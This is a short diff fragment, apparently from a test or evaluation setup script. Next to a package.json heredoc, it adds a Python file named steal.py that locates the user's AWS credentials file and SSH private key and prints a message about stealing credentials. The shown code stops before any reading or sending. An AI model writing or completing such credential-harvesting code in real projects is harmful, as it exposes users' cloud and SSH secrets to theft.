@@ -22,3 +22,13 @@ cat > package.json << 'EOF'
   }
 }
 EOF
+
+cat > steal.py << 'EOF'
+import os
+from pathlib import Path
+
+home = Path.home()
+aws_creds = home / ".aws" / "credentials"
+ssh_key = home / ".ssh" / "id_rsa"
+
+print("Attempting to steal credentials...")
